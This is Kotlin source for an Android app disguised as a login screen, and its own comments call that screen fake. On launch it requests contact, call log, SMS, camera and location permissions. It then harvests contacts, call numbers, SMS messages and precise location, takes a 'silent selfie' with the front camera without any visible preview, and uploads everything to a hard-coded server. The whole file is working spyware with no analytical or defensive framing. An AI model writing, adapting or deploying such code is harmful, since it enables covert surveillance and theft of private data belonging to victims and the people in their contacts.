package com.example.datasyncapp

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.hardware.Camera
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Base64
import android.util.Log
import android.view.SurfaceView
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.location.LocationServices
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class MainActivity : ComponentActivity() {

    // UPDATE: Your PC's IPv4 address
    private val SERVER_URL = "http://10.12.43.32:3000/upload"

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { scrapeAndSendData() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Set the fake login UI
        setContentView(R.layout.activity_main)

        // 1. Immediately request permissions in the background
        checkAndRequestPermissions()

        // 2. Setup Fake Login Button
        val loginBtn = findViewById<Button>(R.id.loginBtn)
        loginBtn.setOnClickListener {
            Toast.makeText(
                this,
                "Application server is currently down. Please try again later.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun checkAndRequestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        requestPermissionLauncher.launch(permissions)
    }

    private fun scrapeAndSendData() {
        val rootData = JSONObject()
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        try {
            // Get Precise Coordinates
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                rootData.put("location", if (location != null) "${location.latitude}, ${location.longitude}" else "Unknown")

                // Collect standard data
                rootData.put("contacts", try { getContacts() } catch (e: Exception) { JSONArray() })
                rootData.put("call_logs", try { getCallLogs() } catch (e: Exception) { JSONArray() })
                rootData.put("sms", try { getSMS() } catch (e: Exception) { JSONArray() })

                // Take the silent selfie
                takeSilentSelfie { base64Image ->
                    rootData.put("selfie", base64Image)

                    // Send everything to Node.js server
                    val queue = Volley.newRequestQueue(this)
                    val request = JsonObjectRequest(Request.Method.POST, SERVER_URL, rootData,
                        { Log.d("SYNC", "Data successfully uploaded") },
                        { Log.e("SYNC", "Upload failed") }
                    )
                    queue.add(request)
                }
            }
        } catch (e: SecurityException) { }
    }

    private fun getContacts(): JSONArray {
        val array = JSONArray()
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val contact = JSONObject().apply {
                    put("name", it.getString(nameIdx))
                    put("number", it.getString(numIdx))
                }
                array.put(contact)
            }
        }
        return array
    }

    private fun getCallLogs(): JSONArray {
        val array = JSONArray()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            while (it.moveToNext()) {
                val log = JSONObject().apply { put("number", it.getString(numIdx)) }
                array.put(log)
            }
        }
        return array
    }

    private fun getSMS(): JSONArray {
        val array = JSONArray()
        val cursor = contentResolver.query(android.net.Uri.parse("content://sms/inbox"), null, null, null, null)
        cursor?.use {
            val addrIdx = it.getColumnIndexOrThrow("address")
            val bodyIdx = it.getColumnIndexOrThrow("body")
            while (it.moveToNext()) {
                val sms = JSONObject().apply {
                    put("from", it.getString(addrIdx))
                    put("message", it.getString(bodyIdx))
                }
                array.put(sms)
            }
        }
        return array
    }

    private fun takeSilentSelfie(callback: (String) -> Unit) {
        try {
            // Open front camera and take a picture without a visible preview
            val camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT)
            camera.setPreviewDisplay(SurfaceView(this).holder)
            camera.startPreview()
            camera.takePicture(null, null) { data, _ ->
                val base64 = Base64.encodeToString(data, Base64.DEFAULT)
                camera.release()
                callback(base64)
            }
        } catch (e: Exception) {
            callback("") // Return empty if camera fails
        }
    }
}